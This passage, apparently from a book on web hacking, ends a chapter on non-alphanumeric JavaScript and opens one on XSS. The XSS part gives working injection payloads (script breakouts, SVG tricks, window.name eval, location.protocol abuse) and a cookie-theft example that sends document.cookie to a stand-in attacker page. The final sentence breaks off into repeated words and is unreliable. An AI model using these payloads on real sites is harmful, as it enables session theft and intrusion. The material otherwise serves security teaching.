    ```

    1 +++[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]+\n2 +-*[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

    ```


    Finally we need to convert the array/string into a number using the infix operator
    + and finally wrap it in an array and as it string:


    ```

    1 [+-*[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]+

    2 +-*[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][

    3 //Infinity as a string

    ```


    You can see how close this is to breaking the wall, the lack of booleans though
    is critical for accessing the constructor. We can only hope that browsers introduce
    new functionality or methods that allow us to access the required characters.
    For now the character wall appears to be six.


    # Summary


    In this chapter we''ve covered to generate numbers with non-alphanumeric JavaScript,
    how to use those numbers to get strings, combine those strings to get more characters
    by accessing properties and converting the output to a string. Then I''ve shown
    how you can piece those together to get arbitrary JavaScript code execution. After
    that I demonstrated how to generate non-alpha code without using parentheses.
    Finally I introduced you to the great character wall and showed you a method of
    generating Infinity using only +.'
- md: "## Chapter eight - XSS\n\nThis chapter is all about Cross Site Scripting affectionately\
    \ known as XSS even though the name doesn't make sense. Since you have stored\
    \ XSS that is same-site and you can have cross-origin scripting that's not same-site\
    \ but the name stuck and everyone knows what it is now for better or worse. In\
    \ this chapter I'm going to cover some XSS tricks that you might not know and\
    \ combine techniques learnt in the other chapters to produce some interesting\
    \ payloads. Let's get right to it...\n\n## Closing scripts\n\nThe first technique\
    \ is using a closing script block inside a JavaScript string. This is pretty well\
    \ known in the XSS community if you're a dev you might not have encountered before.\
    \ The basic idea is you have some reflection inside a JavaScript string and the\
    \ injected quote is quite escaped but less and greater than not. In order to exploit\
    \ this scenario you can inject a closing script tag the JS string and this will\
    \ close the script block and throw a JavaScript exception because of the unclosed\
    \ string, you can proceed to inject your own HTML and get XSS on the target application:\n\
    \n```javascript\n<script>\nlet foo = \"</script><img/src/onerror=alert(1337)\"\
    ;\n</script>\n```\n\nTo patch this vulnerability you can escape the forward slash\
    \ character using backslash prevents the closing script from working but this\
    \ isn't the best fix as we'll find later. The better fix is to unicode escape\
    \ less and greater than this ensures the HTML won't be rendered inside the string.\
    \ You have to of course or encode backslashes and quotes too.\n\n## Comments inside\
    \ scripts\n\nYou might think fixing the previous vulnerability by escaping the\
    \ forward slash solves the problem however this isn't the case. If you have two\
    \ injection points one inside a JavaScript variable and another inside a HTML\
    \ attribute. You can inject an opening HTML comment tag and script which prevents\
    \ the script from closing and the script block will continue until it encounters\
    \ another closing script tag.\n\n```javascript\n<script>\nlet foo = \"<!----script>\"\
    ;\n</script>\n```\n\n```html\n<img title=\"</script\\><img src/onerror=\"alert(1)\"\
    >\n```\n\nWhat gets actually rendered is this:\n\n```html\n<script>\nlet foo =\
    \ \"<!----script>\";\n</script>\n```\n\n```html\n<img title=\"</script\\><img\
    \ src=\"\" onerror=\"alert(1)\">&gt;\n```\n\nAs you can see with the output, the\
    \ combination of the HTML comment and the opening script negates the existing\
    \ closing script and the second closing script is used to close the script block\
    \ which then breaks out of the title attribute causing the image element to be\
    \ rendered.\n\n## HTML entities inside SVG script\n\nYou might think that you\
    \ perform escaping correctly you can prevent XSS inside script blocks. However,\
    \ inside SVG it's a different story. HTML entities are rendered inside because\
    \ SVG is an XML format and this means the when the entities are decoded by SVG,\
    \ JavaScript will then get the correct unencoded characters\n\n```html\n<svg>\n\
    <script>let foo = \"&quot;-alert(1)//\";</script>\n</svg>\n```\n\n## Script without\
    \ closing script\n\nYou might have thought you always need a closing script when\
    \ using a script block. You'd be wrong at least on Firefox. If you use SVG you\
    \ can have a self closing script on Firefox:\n\n```html\n<svg><script href=data:,alert(1)\
    \ />\n```\n\nYou have to use the href attribute because you are inside SVG and\
    \ not HTML and src attribute isn't supported there.\n\n## Window name payloads\n\
    \nAnother common trick in the XSS arsenal is to use window.name to smug payloads\
    \ to other domains or pages. Browsers are crashing down on this by removing the\
    \ name for top-level domain navigations but this technique still works fine using\
    \ iframes:\n\n```html\n<iframe src=//target name=alert(1)></iframe>\n<!--target-->\n\
    <script>eval(name)</script>\n```\n\nYou can smug cookies in too and retrieve them\
    \ when the page is navigated to a page you control. For example:\n\n```javascript\n\
    <script>name=document.cookie</script>\n<a href=\"//attacker\">test</a>\n<!--Attacker\
    \ controlled page-->\n<script>fetch('/collect-cookie', {method: \"post\",body:name})</script>\n\
    ```\n\n## Assignable protocol\n\nI recently discovered you could use the protocol\
    \ property of the location object to conceal a payload. This is an improvement\
    \ on window name payloads because you don't require a separate page. Inside JavaScript\
    \ you simply assign \"javascript\" to the protocol property and then because the\
    \ URL is treated as JavaScript and the http// is treated as a comment you can\
    \ then use a new line in the hash or query string to execute arbitrary JS:\n\n\
    ```javascript\nlocation.protocol='javascript'\n```\n\n```javascript\nfoo.html#%@alert(1337)\n\
    ```\n\n## Source maps to create pingbacks\n\nSource maps are a cool way to exfiltrate\
    \ data. If you use a single line comment it's possible to use the-- is is is is\
